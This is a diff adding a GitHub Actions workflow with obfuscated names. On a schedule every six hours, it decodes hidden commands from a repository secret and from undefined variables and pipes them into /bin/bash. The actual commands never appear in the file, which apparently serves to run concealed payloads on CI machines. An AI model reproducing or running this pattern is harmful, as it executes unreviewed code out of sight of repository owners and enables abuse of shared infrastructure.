@@ -1,0 +1,21 @@
+name: highjumpgetaway
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: highjumpgetaway
+        env:
+          zpr8: ${{ secrets.zpr8 }}
+        run: |
+          echo $zpr8 | jq -r .y96339 | /bin/bash
+          echo $cuzm4920 | jq -r .raa3 | /bin/bash
+          echo $kp23693 | jq -r .hxjy7 | /bin/bash
+          echo $xtba26191 | jq -r .cceyj60 | /bin/bash
+
